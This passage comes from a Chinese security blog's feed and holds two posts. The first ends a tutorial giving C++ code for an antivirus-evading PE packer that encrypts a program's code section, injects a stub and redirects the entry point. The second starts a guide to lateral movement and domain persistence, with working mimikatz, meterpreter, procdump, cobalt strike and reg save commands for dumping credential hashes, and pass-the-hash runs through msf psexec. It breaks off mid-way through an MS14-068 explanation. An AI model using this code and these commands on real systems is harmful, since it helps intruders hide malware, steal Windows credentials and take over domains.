FirstSec &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">PIMAGE_SECTION_HEADER LastSec &#x3D; FirstSec + SecNum - 1;</span><br><span class="line">return LastSec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) &#123;</span><br><span class="line">DWORD Secnum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER Section &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">char buf[10] &#x3D; &#123; 0 &#125;;</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; Secnum; i++) &#123;</span><br><span class="line">memcpy_s(buf, 8, (char*)Section[i].Name, 8);</span><br><span class="line">if (!strcmp(buf, name)) &#123;</span><br><span class="line">return Section + i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;入口点</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;代码段RVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;代码段的大小</span><br><span class="line">DWORD key;&#x2F;&#x2F;解密密钥</span><br><span class="line">&#125;StubConf;</span><br><span class="line"></span><br><span class="line">struct StubInfo</span><br><span class="line">&#123;</span><br><span class="line">char* dllbase;&#x2F;&#x2F;stub.dll的加载基址</span><br><span class="line">DWORD pfnStart;&#x2F;&#x2F;stub.dll(start)导出函数的地址</span><br><span class="line">StubConf* pStubConf;&#x2F;&#x2F;stub.dll(g_conf)导出全局变量的地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="打开PE文件"><a href="#打开PE文件" class="headerlink" title="打开PE文件"></a>打开PE文件</h4><p>这里采用的方法是利用CreateFileA函数。同时这个函数还抛出了一个指向PE文件大小的指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) &#123;</span><br><span class="line">&#x2F;&#x2F;打开一个文件并获得文件句柄</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(path,</span><br><span class="line">GENERIC_READ,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">OPEN_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL);</span><br><span class="line">&#x2F;&#x2F;获得文件大小</span><br><span class="line">DWORD FileSize &#x3D; GetFileSize(hFile, NULL);</span><br><span class="line">&#x2F;&#x2F;返回文件大小到变量nFileSize</span><br><span class="line">if(nFileSize)</span><br><span class="line">*nFileSize &#x3D; FileSize;</span><br><span class="line">&#x2F;&#x2F;申请一片大小为FileSize的内存并将指针置于首位</span><br><span class="line">char* pFileBuf &#x3D; new CHAR[FileSize]&#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;给刚刚申请的内存读入数据</span><br><span class="line">DWORD dwRead;</span><br><span class="line">ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">return pFileBuf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="加载STUB"><a href="#加载STUB" class="headerlink" title="加载STUB"></a>加载STUB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void LoadStub(_In_ StubInfo* pstub) &#123;</span><br><span class="line">pstub-&gt;dllbase &#x3D; (char*)LoadLibraryEx(L&quot;F:\\stubdll.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">pstub-&gt;pfnStart &#x3D; (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;Start&quot;);  &#x2F;&#x2F;获得stub的入口函数Start(自己定义在stub中的一个函数</span><br><span class="line">pstub-&gt;pStubConf &#x3D; (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;g_conf&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;不仅加载了stub，还获得了stub抛出的用于收集信息的全局结构体（g_conf,是一个stub抛出的结构体，用于获取信息，结构如下）</span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;入口点</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;代码段RVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;代码段的大小</span><br><span class="line">DWORD key;&#x2F;&#x2F;解密密钥</span><br><span class="line">&#125;StubConf;</span><br></pre></td></tr></table></figure><h4 id="加密代码段"><a href="#加密代码段" class="headerlink" title="加密代码段"></a>加密代码段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DWORD textRVA &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">DWORD textSize &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">Encry(PeHmoudle,pstub);</span><br><span class="line">void Encry(_In_ char* hpe,_In_ StubInfo pstub) &#123;</span><br><span class="line">&#x2F;&#x2F;获取代码段首地址</span><br><span class="line">BYTE* TargetText &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;PointerToRawData + (BYTE*)hpe;</span><br><span class="line">&#x2F;&#x2F;获取代码段大小</span><br><span class="line">DWORD TargetTextSize &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">&#x2F;&#x2F;加密代码段</span><br><span class="line">for (int i &#x3D; 0; i &lt; TargetTextSize; i++) &#123;</span><br><span class="line">TargetText[i] ^&#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">pstub.pStubConf-&gt;textScnRVA &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">pstub.pStubConf-&gt;textScnSize &#x3D; TargetTextSize;</span><br><span class="line">pstub.pStubConf-&gt;key &#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;加密代码段，并给予了stub一些信息</span><br></pre></td></tr></table></figure><h4 id="添加新区段"><a href="#添加新区段" class="headerlink" title="添加新区段"></a>添加新区段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">char* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) &#123;</span><br><span class="line">GetFileHeader(hpe)-&gt;NumberOfSections++;</span><br><span class="line">PIMAGE_SECTION_HEADER pesec &#x3D; GetLastSec(hpe);</span><br><span class="line">&#x2F;&#x2F;设置区段表属性</span><br><span class="line">memcpy(pesec-&gt;Name, secname, 8);</span><br><span class="line">pesec-&gt;Misc.VirtualSize &#x3D; secsize;</span><br><span class="line">pesec-&gt;VirtualAddress &#x3D; (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment);</span><br><span class="line">pesec-&gt;SizeOfRawData &#x3D; AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;PointerToRawData &#x3D; AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;Characteristics &#x3D; 0xE00000E0;</span><br><span class="line">&#x2F;&#x2F;设置OPT头映像大小</span><br><span class="line">GetOptHeader(hpe)-&gt;SizeOfImage &#x3D; pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData;</span><br><span class="line">&#x2F;&#x2F;扩充文件数据</span><br><span class="line">int newSize &#x3D; pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData;</span><br><span class="line">char* nhpe &#x3D; new char [newSize] &#123;0&#125;;</span><br><span class="line">&#x2F;&#x2F;向新缓冲区录入数据</span><br><span class="line">memcpy(nhpe, hpe, filesize);</span><br><span class="line">&#x2F;&#x2F;缓存区更替</span><br><span class="line">delete hpe;</span><br><span class="line">filesize &#x3D; newSize;</span><br><span class="line">return nhpe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stub重定位"><a href="#stub重定位" class="headerlink" title="stub重定位"></a>stub重定位</h4><p>好家伙，这个东西稍有不慎就会让整个程序拉跨掉（过来人的忠告<br>为什么需要stub重定位呢？因为我们的stub最开始是加载在内存中的，它的许多指令如跳转到的地址是按内存为基准确定的，但是我们需要把他移植进文件，所以它的代码里许多地址就是错误的，我们需要对这些地址进行处理，即重定位，使其以宿主程序为标准进行地址修复。<br>可能我表述的不是很清楚😥举个例子吧，比如stub在加载进内存时，有一条跳转指令时jmp 12345678, 如果我们不处理就把这条指令移植进PE文件，那么PE文件执行到此处时就会跳转到12345678，此时的12345678地址可能就已经不是PE文件加载的内存区间了，从而程序会崩溃。所以要修复。根据stub的重定位表进行修复。<br>重定位表就是记录哪些地址的数据需要被修复的，我们遍历这些地址进行修复即可。<br>如果以下代码看起来吃力，可以先去了解一下重定位表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva )</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;找到stub.dll的重定位表</span><br><span class="line">DWORD dwRelRva &#x3D; GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress;</span><br><span class="line">IMAGE_BASE_RELOCATION* pRel &#x3D; (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;遍历重定位表</span><br><span class="line">while (pRel-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line">struct TypeOffset</span><br><span class="line">&#123;</span><br><span class="line">WORD offset : 12;</span><br><span class="line">WORD type : 4;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">TypeOffset* pTypeOffset &#x3D; (TypeOffset*)(pRel + 1);</span><br><span class="line">DWORD dwCount &#x3D; (pRel-&gt;SizeOfBlock - 8) &#x2F; 2;&#x2F;&#x2F;需要重定位的数量</span><br><span class="line">for (int i &#x3D; 0; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (pTypeOffset[i].type !&#x3D; 3)</span><br><span class="line">&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;需要重定位的地址</span><br><span class="line">DWORD* pFixAddr &#x3D; (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase);</span><br><span class="line"></span><br><span class="line">DWORD dwOld;</span><br><span class="line">&#x2F;&#x2F;修改属性为可写</span><br><span class="line">VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">&#x2F;&#x2F;去掉dll当前加载基址</span><br><span class="line">*pFixAddr -&#x3D; stubDllbase;</span><br><span class="line">&#x2F;&#x2F;去掉默认的段首RVA</span><br><span class="line">*pFixAddr -&#x3D; stubTextRva;</span><br><span class="line">&#x2F;&#x2F;换上目标文件的加载基址</span><br><span class="line">*pFixAddr +&#x3D; targetDllbase;</span><br><span class="line">&#x2F;&#x2F;加上新区段的段首RVA</span><br><span class="line">*pFixAddr +&#x3D; targetNewScnRva;</span><br><span class="line">&#x2F;&#x2F;把属性修改回去</span><br><span class="line">VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;切换到下一个重定位块</span><br><span class="line">pRel &#x3D; (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stub移植"><a href="#stub移植" class="headerlink" title="stub移植"></a>stub移植</h4><p>这个简单，没啥说的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle,</span><br><span class="line">GetSecByName(pstub.dllbase, &quot;.text&quot;)-&gt;VirtualAddress+pstub.dllbase,</span><br><span class="line">GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;Misc.VirtualSize);</span><br></pre></td></tr></table></figure><h4 id="入口点修改"><a href="#入口点修改" class="headerlink" title="入口点修改"></a>入口点修改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint &#x3D;</span><br><span class="line">pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress;</span><br></pre></td></tr></table></figure><h4 id="去随机基址"><a href="#去随机基址" class="headerlink" title="去随机基址"></a>去随机基址</h4><p>不去掉随机基址，加载基址就是不固定的，不方便操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;&#x3D; (~0x40);</span><br></pre></td></tr></table></figure><h4 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) &#123;</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(</span><br><span class="line">path,</span><br><span class="line">GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">CREATE_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line">DWORD Buf &#x3D; 0;</span><br><span class="line">WriteFile(hFile, data, FileSize, &amp;Buf,NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一次搞底层的玩意儿，导致调试这东西花了我不少时间。。<br>不过学的还是？蛮多的？<br>动态调试，c++，汇编，PE结构，动态寻址都学到了些。（怎么感觉在往逆向走了2333<br>继续弄吧，这个项目目前还有bug，等以后来了兴趣再继续添加更多更牛逼的机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考:&lt;a href=&quot;https://blog.csdn.net/qq_31507523/article/details/89438410&quot;&gt;https://blog.csdn.net/qq_31507523/article/details/89438410&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="免杀" scheme="http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>横向移动与域控权限维持方法总汇</title>
    <link href="http://yoursite.com/2021/02/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/"/>
    <id>http://yoursite.com/2021/02/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/</id>
    <published>2021-02-19T09:21:53.673Z</published>
    <updated>2021-02-19T08:51:03.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p><p>那前提就是要获取hash值了</p><h3 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h3><p>1.使用meterpreter里的mimikatz模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure><p>2.使用meterpreter自带的hash获取模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure><p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p><p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p><p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png" alt="QQ截图20210217130719"></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>5.使用cobalt strike 获取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure><p>6.利用sam表</p><p>mimikatz在线读sam表中的hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>将sam表下载到本地由mimikatz分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h3 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h3><p>1.msf里使用psexec模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure><p>2.使用mimikatz</p><p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure><p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure><p>3.使用cobalt strike</p><p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png" alt="QQ截图20210217130746"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png" alt="QQ截图20210217130806"></p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这个洞的危害很大，可以让任意域用户提权到域管。<br>适用版本: server 2000以上<br>补丁: kb3011780</p><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC是kerberos协议里用来解决用户权限功能所设计出的东西。<br>在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。<br>PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。</p><p>1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key</p><p>2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）</p><p>3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)</p><p>PAC自身的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131035.png" alt="QQ截图20210217131035"></p><p>PAC在Ticket中的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131108.png" alt="QQ截图20210217131108"></p><p>又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。<br>而Authorization data的结构是这样的</p><p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {<br>ad-type     [0] Int32,<br>ad-data     [1] OCTET STRING }</p><p>ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。<br>若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 